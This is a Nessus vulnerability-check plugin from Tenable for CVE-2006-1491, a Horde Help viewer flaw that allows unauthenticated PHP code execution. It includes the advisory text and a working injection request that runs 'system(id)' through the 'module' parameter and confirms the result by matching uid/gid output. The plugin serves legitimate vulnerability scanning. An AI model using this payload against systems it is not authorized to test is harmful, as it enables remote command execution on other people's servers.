#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that allows execution
of arbitrary PHP code. 

Description :

The version of Horde installed on the remote host fails to sanitize
user-supplied input before using it in the Help viewer to evaluate
code.  An unauthenticated attacker could exploit this flaw to execute
arbitrary command on the remote host subject to the privileges of the
web server user id. 

See also :

http://lists.horde.org/archives/announce/2006/000272.html
http://lists.horde.org/archives/announce/2006/000271.html

Solution :

Upgrade to Horde 3.0.10 / 3.1.1 or later.

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(21164);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1491");
  script_bugtraq_id(17292);

  script_name(english:"Horde Help Viewer Code Execution Vulnerability");
  script_summary(english:"Tries to run a command using Horde's help viewer");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("horde_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/horde"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  cmd = "id";
  http_check_remote_code(
    unique_dir    : dir,
    check_request : string(
      "/services/help/index.php?",
      "module=horde%22;system(", cmd, ");&",
      "show=about"
    ),
    check_result  : "uid=[0-9]+.*gid=[0-9]+.*",
    command       : cmd,
    description   : desc
  );
}
